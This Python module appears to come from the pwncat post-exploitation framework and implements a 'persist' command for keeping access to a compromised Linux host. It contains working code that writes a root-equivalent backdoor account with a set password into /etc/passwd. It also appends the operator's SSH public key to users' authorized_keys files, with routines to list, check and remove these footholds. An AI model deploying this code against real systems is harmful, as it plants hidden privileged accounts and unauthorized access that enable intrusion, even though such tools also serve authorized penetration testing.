#!/usr/bin/env python3
from typing import Dict, Type
from pwncat.commands.base import CommandDefinition, Complete, parameter, StoreConstOnce
from pwncat.util import Access
from colorama import Fore
from pwncat import util
import crypt
import os


class PersistenceError(Exception):
    """ Error while deploying persistence method """


class Command(CommandDefinition):
    """ Manage various persistence methods on the remote host """

    def get_method_choices(self):
        return [name for name in self.methods]

    def get_user_choices(self):
        """ Get the user options """
        current = self.pty.current_user
        if current["name"] == "root" or current["uid"] == 0:
            return [name for name in self.pty.users]
        else:
            return [current["name"]]

    PROG = "persist"
    ARGS = {
        "--method,-m": parameter(
            Complete.CHOICES,
            metavar="METHOD",
            help="Select a persistence method to deploy",
            choices=get_method_choices,
        ),
        "--user,-u": parameter(
            Complete.CHOICES,
            metavar="USER",
            help="For non-system persistence modules, the user to install as (only valid if currently UID 0)",
            choices=get_user_choices,
        ),
        "--status,-s": parameter(
            Complete.NONE,
            action=StoreConstOnce,
            nargs=0,
            dest="action",
            const="status",
            help="Check the status of the given persistence method",
        ),
        "--install,-i": parameter(
            Complete.NONE,
            action=StoreConstOnce,
            nargs=0,
            dest="action",
            const="install",
            help="Install the selected persistence method",
        ),
        "--list,-l": parameter(
            Complete.NONE,
            nargs=0,
            action=StoreConstOnce,
            dest="action",
            const="list",
            help="List all available persistence methods",
        ),
        "--remove,-r": parameter(
            Complete.NONE,
            nargs=0,
            action=StoreConstOnce,
            dest="action",
            const="remove",
            help="Remove the selected persistence method",
        ),
        "--clean,-c": parameter(
            Complete.NONE,
            nargs=0,
            action=StoreConstOnce,
            dest="action",
            const="clean",
            help="Remove all installed persistence methods",
        ),
    }
    DEFAULTS = {"action": "status"}

    # List of available persistence methods
    METHODS: Dict[str, Type["PersistenceMethod"]] = {}

    def __init__(self, pty: "pwncat.pty.PtyHandler", cmdparser: "CommandParser"):
        super(Command, self).__init__(pty, cmdparser)

        # Build all the persistence method objects
        self.methods: Dict[str, "PersistanceMethod"] = {}
        for name, method in Command.METHODS.items():
            self.methods[name] = method(self.pty)

    @property
    def installed_methods(self):
        me = self.pty.current_user
        for name, method in self.methods.items():
            if method.system and method.check(user=None):
                yield (name, None, method)
            elif not method.system:
                if me["uid"] == 0:
                    for user in self.pty.users:
                        util.progress(f"checking {name} for: {user}")
                        if method.check(user):
                            util.erase_progress()
                            yield (name, user, method)
                        util.erase_progress()
                else:
                    if method.check(me["name"]):
                        yield (name, me["name"], method)

    def run(self, args):

        if args.action == "status":
            ninstalled = 0
            for name, user, method in self.installed_methods:
                print(f" - {method.format_name(name, user)}")
                ninstalled += 1
            if not ninstalled:
                util.warn(
                    "no persistence methods observed as "
                    f"{Fore.GREEN}{self.pty.whoami()}{Fore.RED}"
                )
            return
        elif args.action == "list":
            for name, method in self.methods.items():
                print(f" - {method.format_name(name,None)}")
            return
        elif args.action == "clean":
            util.progress("cleaning persistence methods: ")
            for name, user, method in self.installed_methods:
                try:
                    util.progress(
                        f"cleaning persistance methods: {method.format_name(name,user)}"
                    )
                    method.remove(user)
                    util.success(f"removed {method.format_name(name,user)}")
                except PersistenceError as exc:
                    util.erase_progress()
                    util.warn(f"{name}: removal failed: {exc}\n", overlay=True)
            util.erase_progress()
            return
        elif args.method is None:
            self.parser.error("no method specified")
            return

        # Lookup the method
        method = self.methods[args.method]

        # Grab the user we want to install the persistence as
        if args.user:
            user = args.user
        else:
            # Default is to install as current user
            user = self.pty.whoami()

        if args.action == "install":
            try:

                # Check that the module isn't already installed
                if method.check(user):
                    util.error(
                        f"{method.format_name(args.method,user)} already installed"
                    )
                    return

                util.success(f"installing {method.format_name(args.method, user)}")

                # Install the persistence
                method.install(user)
            except PersistenceError as exc:
                util.error(
                    f"{method.format_name(args.method,user)}: install failed: {exc}"
                )
        elif args.action == "remove":
            try:

                # Check that the module isn't already installed
                if not method.check(user):
                    util.error(f"{method.format_name(args.method,user)} not installed")
                    return

                util.success(f"removing {method.format_name(args.method, user)}")

                # Remove the method
                method.remove(user)
            except PersistenceError as exc:
                util.error(
                    f"{method.format_name(args.method,user)}: removal failed: {exc}"
                )

    @classmethod
    def add_method(cls, name: str):
        def _wrapper(method_class: Type["PersistenceMethod"]):
            if name in cls.METHODS:
                raise RuntimeError(f"{name}: duplicate persistence method name")
            cls.METHODS[name] = method_class

        return _wrapper


class PersistenceMethod:

    # Whether this method is system-wide or user-specific
    system = False

    def __init__(self, pty: "pwncat.pty.PtyHandler"):
        self.pty = pty

    def check(self, user: str):
        """ Check if this persistence method is installed """
        raise NotImplementedError

    def install(self, user: str):
        """ Install this persistence method on the remote host """
        raise NotImplementedError

    def remove(self, user: str):
        """ Remove this persistence method from the remote host """
        raise NotImplementedError

    def format_name(self, name: str, user: str):
        """ Format the name and user into a printable display name """
        if self.system:
            return f"{Fore.CYAN}{name}{Fore.RESET} ({Fore.RED}system{Fore.RESET})"
        else:
            if user is None:
                user = "user"
            return f"{Fore.CYAN}{name}{Fore.RESET} as {Fore.GREEN}{user}{Fore.RESET}"


@Command.add_method("passwd")
class BackdoorUser(PersistenceMethod):
    """ Install a backdoor user in /etc/passwd with UID and GID == 0. This
    requires root permissions. """

    # This is a system-wide persistence module
    system = True

    def check(self, user: str):
        return self.pty.config["backdoor_user"] in self.pty.users

    def install(self, user: str):

        try:
            # Read the /etc/passwd file
            with self.pty.open("/etc/passwd", "r") as filp:
                passwd = filp.readlines()
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistenceError(str(exc))

        # Grab the properties from the configuration
        user = self.pty.config["backdoor_user"]
        password = self.pty.config["backdoor_pass"]
        hashed = crypt.crypt(password)

        # Add the new passwd entry
        passwd.append(f"{user}:{hashed}:0:0::/root:{self.pty.shell}\n")
        passwd_content = "".join(passwd)

        try:
            # Write the new passwd entries
            with self.pty.open("/etc/passwd", "w", length=len(passwd_content)) as filp:
                filp.write(passwd_content)
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistenceError(str(exc))

        self.pty.reload_users()

    def remove(self, user: str):

        try:
            # Read the /etc/passwd file
            with self.pty.open("/etc/passwd", "r") as filp:
                passwd = filp.readlines()
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistenceError(str(exc))

        # Grab the properties from the configuration
        user = self.pty.config["backdoor_user"]

        # Remove any entries that are for the backdoor user (just in case
        # there's more than one for some reason).
        new_passwd = []
        for entry in passwd:
            if not entry.startswith(f"{user}:"):
                new_passwd.append(entry)

        # Build the content
        passwd_content = "".join(new_passwd)

        try:
            # Write the new passwd entries
            with self.pty.open("/etc/passwd", "w", length=len(passwd_content)) as filp:
                filp.write(passwd_content)
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistenceError(str(exc))

        self.pty.reload_users()

    def __str__(self):
        return "/etc/passwd backdoor"


@Command.add_method("ssh-public-key")
class SshPublicKeyPersistence(PersistenceMethod):
    """ Add SSH public-key persistenc to the current user """

    # This is a user-based persistence module, not a system-wide persistence
    # module.
    system = False

    def check(self, user: str):

        homedir = self.pty.users[user]["home"]
        if not homedir or homedir == "":
            return False

        # Create .ssh directory if it doesn't exist
        access = self.pty.access(os.path.join(homedir, ".ssh"))
        if Access.DIRECTORY not in access or Access.EXISTS not in access:
            return False

        # Create the authorized_keys file if it doesn't exist
        access = self.pty.access(os.path.join(homedir, ".ssh", "authorized_keys"))
        if Access.EXISTS not in access:
            return False
        else:
            try:
                # Read in the current authorized keys if it exists
                with self.pty.open(
                    os.path.join(homedir, ".ssh", "authorized_keys"), "r"
                ) as filp:
                    authkeys = filp.readlines()
            except (FileNotFoundError, PermissionError) as exc:
                return False
        try:
            # Read our public key
            with open(self.pty.config["privkey"] + ".pub", "r") as filp:
                pubkey = filp.readlines()
        except (FileNotFoundError, PermissionError) as exc:
            return False

        # Ensure we read a public key
        if not pubkey:
            return False

        return pubkey[0] in authkeys

    def install(self, user: str):

        homedir = self.pty.users[user]["home"]
        if not homedir or homedir == "":
            return False

        # Create .ssh directory if it doesn't exist
        access = self.pty.access(os.path.join(homedir, ".ssh"))
        if Access.DIRECTORY not in access or Access.EXISTS not in access:
            self.pty.run(["mkdir", os.path.join(homedir, ".ssh")])

        # Create the authorized_keys file if it doesn't exist
        access = self.pty.access(os.path.join(homedir, ".ssh", "authorized_keys"))
        if Access.EXISTS not in access:
            self.pty.run(["touch", os.path.join(homedir, ".ssh", "authorized_keys")])
            self.pty.run(
                ["chmod", "600", os.path.join(homedir, ".ssh", "authorized_keys")]
            )
            authkeys = []
        else:
            try:
                # Read in the current authorized keys if it exists
                with self.pty.open(
                    os.path.join(homedir, ".ssh", "authorized_keys"), "r"
                ) as filp:
                    authkeys = filp.readlines()
            except (FileNotFoundError, PermissionError) as exc:
                raise PersistenceError(str(exc))

        try:
            # Read our public key
            with open(self.pty.config["privkey"] + ".pub", "r") as filp:
                pubkey = filp.readlines()
        except (FileNotFoundError, PermissionError) as exc:
            raise PersistenceError(str(exc))

        # Ensure we read a public key
        if not pubkey:
            raise PersistenceError(
                f"{self.pty.config['privkey']+'.pub'}: empty public key"
            )

        # Add our public key
        authkeys.extend(pubkey)
        authkey_data = "".join(authkeys)

        # Write the authorized keys back to the authorized keys
        try:
            with self.pty.open(
                os.path.join(homedir, ".ssh", "authorized_keys"),
                "w",
                length=len(authkey_data),
            ) as filp:
                filp.write(authkey_data)
        except (FileNotFoundError, PermissionError) as exc:
            raise PersistenceError(str(exc))

    def remove(self, user):

        homedir = self.pty.users[user]["home"]
        if not homedir or homedir == "":
            return False

        try:
            # Read in the current authorized keys if it exists
            with self.pty.open(
                os.path.join(homedir, ".ssh", "authorized_keys"), "r"
            ) as filp:
                authkeys = filp.readlines()
        except (FileNotFoundError, PermissionError) as exc:
            raise PersistenceError(str(exc))

        try:
            # Read our public key
            with open(self.pty.config["privkey"] + ".pub", "r") as filp:
                pubkey = filp.readlines()
        except (FileNotFoundError, PermissionError) as exc:
            raise PersistenceError(str(exc))

        # Ensure we read a public key
        if not pubkey:
            raise PersistenceError(
                f"{self.pty.config['privkey']+'.pub'}: empty public key"
            )

        # Build a new authkeys without our public key
        new_authkeys = []
        for key in authkeys:
            if key not in pubkey:
                new_authkeys.append(key)

        authkey_data = "".join(new_authkeys)

        # Write the authorized keys back to the authorized keys
        try:
            with self.pty.open(
                os.path.join(homedir, ".ssh", "authorized_keys"),
                "w",
                length=len(authkey_data),
            ) as filp:
                filp.write(authkey_data)
        except (FileNotFoundError, PermissionError) as exc:
            raise PersistenceError(str(exc))
